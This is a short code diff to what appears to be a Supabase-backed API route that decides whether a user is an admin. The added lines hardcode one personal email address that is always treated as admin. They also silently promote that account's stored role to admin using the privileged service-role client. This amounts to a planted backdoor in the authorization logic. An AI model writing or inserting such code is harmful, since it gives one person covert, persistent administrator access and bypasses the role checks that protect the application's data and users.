@@ -15,7 +15,17 @@ export async function GET() {
     .eq('id', user.id)
     .single();
 
-  const isAdmin = profile?.role === 'admin';
+  let isAdmin = profile?.role === 'admin';
+
+  if (user.email === 'kedogosospeter36@gmail.com') {
+    isAdmin = true;
+    if (profile?.role !== 'admin') {
+      // Auto promote to admin using the service role client
+      const adminSupabase = createAdminSupabaseClient();
+      await adminSupabase.from('profiles').update({ role: 'admin' }).eq('id', user.id);
+    }
+  }
+
 
   // If not admin, they get minimal dummy/safe data or 403.
   if (!isAdmin) {
